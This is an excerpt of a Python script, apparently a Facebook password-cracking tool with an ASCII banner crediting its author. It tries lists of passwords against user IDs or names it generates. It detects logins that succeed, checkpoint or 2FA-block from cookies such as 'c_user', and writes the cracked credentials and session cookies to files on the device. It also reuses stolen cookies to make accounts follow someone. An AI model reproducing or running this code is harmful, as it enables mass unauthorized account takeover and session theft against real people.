...
logo4 = """                                  
\x1b[1;92m     .M---bgd `YMM'   `MP' `7MM---Yp, 
\x1b[1;92m    ,MI    "Y   VMb.  ,P     MM    Yb 
\x1b[1;92m    `MMb.        `MM.M'      MM    dP 
\x1b[1;92m      `YMMNq.      MMb       MM---bg. 
\x1b[1;92m    .     `MM    ,M' `M.     MM    `Y 
\x1b[1;92m    Mb     dM   ,P    `M.    MM    ,9 
\x1b[1;92m    ''Ybmmd"  .MM:.  .:MMa..JMMmmmd9  
\x1b[1;97m--------------------------------------------------
\x1b[1;93m[~] \x1b[1;92mAuthor  : Talha Rajput
\x1b[1;93m[~] \x1b[1;92mGithub  : https://github.com/Programming-SXB
\x1b[1;93m[~] \x1b[1;92mFacebok : Talha Rajput
\x1b[1;93m[~] \x1b[1;92mVersion : 0.0.1
\x1b[1;97m--------------------------------------------------"""                                  
...
class crack:
    ...
    def plerr(self):
        ...
        print ('\033[1;32m[4] WhatsApp Group (Join)\033[0;97m')
        print ('\033[1;32m[0] Exit\033[0;97m')
        print (47*'-')
        vg = input('\033[1;32m[+] Select an option : \033[0;97m')
        if vg == '1':
            try:
                filr = input('[+] \033[1;36mfile location : \033[0;97m')
                self.id = open(filr).read().splitlines()
                print ('\n [%s+%s] total id -> %s%s%s' %(OO,NN,MM,len(self.id),NN))
                self.apk = '\033[1;37m[+] file location : '+(filr)
                self.__passw__()
            ...
            os.system('clear')
            print (logo4)
            print ('[+] \033[1;32mExample : Ali khan : Faisal malik : Noor khan \033[0;97m'),linex()
            emz = input('[+] \033[1;33mEnter Name : \033[0;97m')
            os.system('clear')
            print (logo4)
            print ('[+] \033[1;32mExample : @gmail.com • yahoo.com • hotmail.com\033[0;97m'),linex()
    ...
    def __passw__(self):
        ...
        linex()
        td = input('[+] \033[1;36mSelect an option : \033[0;97m')
        if td == '1':
            os.system('clear')
            print (logo4)
            print ('')
        ...
        for pw in __juts__:
            try:
                ...
                if "c_user" in str(cok):
                    ...
                    print(f"\r{HH}[OK] {user} | {pw} {VV}    ")
                    open("/sdcard/FILE_OK.txt", "a").write(user + "|" + pw + "\n")
                    open("/sdcard/OK-ID_cokie.txt", "a").write(user + "|" + pw + " | " + coki + "\n")
                    ok.append(user + pw)
                    self.follow(coki)
                    break
        ...
        for pw in __juts__:
            try:
                ...
                if "c_user" in str(cok):
                    ...
                    user=cok['c_user']
                    print(f"\r{HH}[OK] {user} | {pw} {VV}    ")
                    open("/sdcard/FILE-OK.txt", "a").write(user + "|" + pw + "\n")
                    open("/sdcard/OK-ID_Cokie.txt", "a").write(user + "|" + pw + " | " + coki + "\n")
                    ok.append(user + pw)
                    self.follow(coki)
                    break
                    ...
                    if 'Enter login code to continue' in str(rex.text):
                        Mm = '\033[9;31m'
                        print(f"\r\33[1;34m[2F] {user} | {pw}{VV}     ")
                        open("/sdcard/2F.txt", "a").write(user + "|" + pw + "\n")
                        f2.append(user + pw)
                        break
                    else:
                        print(f"\r\33[1;31m[CP] {user} | {pw}{VV}     ")
                        open("/sdcard/FILE_CP.txt", "a").write(user + "|" + pw + "\n")
                        cp.append(user + pw)
                        break
                else:
                    continue
            ...
            try:
                ...
                if 'session_key' in str(q) or 'c_user' in str(q):
                    ...
                    try:
                        ...
                        name=me['name']
                        idd=me['id']
                        print(f"\r{HH}[OK] {used} | {pw} {VV}    ")
                        open("/sdcard/FILE_OK.txt", "a").write(used + "|" + pw + "\n")
                        open("/sdcard/OK-ID_Cokie.txt", "a").write(used + "|" + pw + " | " + cokie + "\n")
                        ok.append(used + pw)
                        ...
                        print(f"\r\033[1;33m[TL] {used} | {pw} {VV}    ")
                        tl.append(used + pw)
                        break
                    ...
                    if len(used)<11 or len(used)>15:
                        used = user
                    print(f"\r\33[1;34m[2F] {used} | {pw}{VV}     ")
                    open("/sdcard/2F.txt", "a").write(used + "|" + pw + "\n")
                    f2.append(used + pw)
                    break
                    ...
                    if 'uid' not in str(q) or 'skip_ixt_start_dialog' in str(q):
                        ...
                        print(f"\r\33[1;31m[CP] {used} | {pw} {VV}    ")
                        open("/sdcard/FILE_CP.txt", "a").write(used + "|" + pw + "\n")
                        cp.append(used + pw)
                        break
                else:
                    continue
